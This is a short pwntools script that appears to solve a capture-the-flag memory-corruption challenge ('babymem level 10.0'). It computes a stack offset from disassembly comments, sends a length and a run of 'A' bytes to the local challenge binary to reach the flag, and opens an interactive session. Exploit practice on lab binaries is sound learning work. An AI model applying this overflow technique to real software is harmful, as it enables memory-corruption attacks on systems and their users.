from pwn import *

# Init
elf = ELF("/challenge/babymem_level10.0")

buffer_length = int("158", 16) #local_158
flag_offset_from_buffer= int("0x3a", 16) #local_160 declared as local_158 putted in RAX + 0x3a (ADD assembly instruction)

print(buffer_length)
print(flag_offset_from_buffer)

io = elf.process()

# Payload
payload = b"A"*(flag_offset_from_buffer)

# Interaction
io.recvuntil("size:")
io.sendline(str(flag_offset_from_buffer))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()
